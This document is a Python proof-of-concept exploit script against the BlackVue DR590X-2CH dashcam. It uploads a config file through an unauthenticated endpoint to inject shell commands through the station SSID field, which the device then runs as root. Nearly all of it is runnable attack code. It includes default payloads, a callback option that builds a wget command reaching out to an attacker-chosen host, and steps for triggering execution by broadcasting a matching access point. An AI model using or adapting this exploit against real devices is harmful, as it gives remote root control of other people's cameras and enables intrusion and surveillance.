#!/usr/bin/env python3
"""BlackVue DR590X-2CH v1.010 - unauthenticated station-SSID command injection.

The script uploads a configuration through the unauthenticated /upload.cgi endpoint
of the dashcam access point.  The [Wifi] sta_ssid value is later used unquoted in
"iwconfig wlan1 essid <ssid>" by main_app and executed as root through sub_app.

After the upload the dashcam must apply the configuration (reboot, power cycle or a
configuration refresh from the mobile app) and must scan an open access point whose
SSID equals the injected value; the command then runs as root.

Usage:
    python3 poc.py --host 10.99.77.1 --ssid 'x;id>/tmp/p;#'
    python3 poc.py --host 10.99.77.1 --callback 192.0.2.10

The payload must fit into an 802.11 SSID (<= 32 bytes) because the device only uses
the configured value when it matches a real scan result.
"""
import argparse
import socket
import sys

BOUNDARY = "----BlackVueBoundary"


def config_body(ssid: str) -> bytes:
    return (
        "[Tab1]\r\n"
        "TimeSet=0\r\n"
        "TimeZone=-1100\r\n"
        "GpsSync=1\r\n"
        "NormalRecord=1\r\n"
        "[Wifi]\r\n"
        "ap_ssid=BlackVue\r\n"
        "ap_pw=\r\n"
        "sta_ssid=%s\r\n"
        "sta_pw=\r\n"
        "WifiSleepMode=1\r\n"
        "[Cloud]\r\n"
        "CloudService=1\r\n" % ssid
    ).encode()


def multipart(ssid: str) -> bytes:
    body = bytearray()
    body += b"--" + BOUNDARY.encode() + b"\r\n"
    body += b'Content-Disposition: form-data; name="FileType"\r\n\r\n'
    body += b"config\r\n"
    body += b"--" + BOUNDARY.encode() + b"\r\n"
    body += b'Content-Disposition: form-data; name="FileData"; filename="config.ini"\r\n'
    body += b"Content-Type: application/octet-stream\r\n\r\n"
    body += config_body(ssid)
    body += b"\r\n--" + BOUNDARY.encode() + b"--\r\n"
    return bytes(body)


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("--host", default="10.99.77.1", help="dashcam address")
    ap.add_argument("--port", type=int, default=80)
    ap.add_argument("--ssid", help="injected SSID value (<= 32 bytes)")
    ap.add_argument("--callback", help="shortcut for 'x;wget -qO- http://<host>;#'")
    args = ap.parse_args()

    ssid = args.ssid
    if ssid is None and args.callback:
        ssid = "x;wget -qO- http://%s;#" % args.callback
        if len(ssid) > 32:
            ssid = "x;ping -c1 %s;#" % args.callback
    if ssid is None:
        ssid = "x;id>/tmp/p;#"
    if len(ssid) > 32:
        print("[!] the SSID is %d bytes; an 802.11 SSID is at most 32 bytes" % len(ssid))
        return 2

    body = multipart(ssid)
    request = (
        "POST /upload.cgi HTTP/1.1\r\n"
        "Host: %s\r\n"
        "Content-Type: multipart/form-data; boundary=%s\r\n"
        "Content-Length: %d\r\n"
        "Connection: close\r\n\r\n" % (args.host, BOUNDARY, len(body))
    ).encode() + body

    print("[*] SSID payload: %s (%d bytes)" % (ssid, len(ssid)))
    try:
        with socket.create_connection((args.host, args.port), 10) as sock:
            sock.sendall(request)
            data = b""
            while True:
                chunk = sock.recv(65536)
                if not chunk:
                    break
                data += chunk
    except OSError as exc:
        print("[!] upload failed: %s" % exc)
        return 1

    status = data.split(b"\r\n", 1)[0].decode("latin-1", "replace")
    print("[*] response: %s" % status)
    if "200" not in status:
        return 1
    print("[*] configuration written; reboot/power-cycle the dashcam and broadcast")
    print("    an open access point with SSID %r to trigger the command" % ssid)
    return 0


if __name__ == "__main__":
    sys.exit(main())
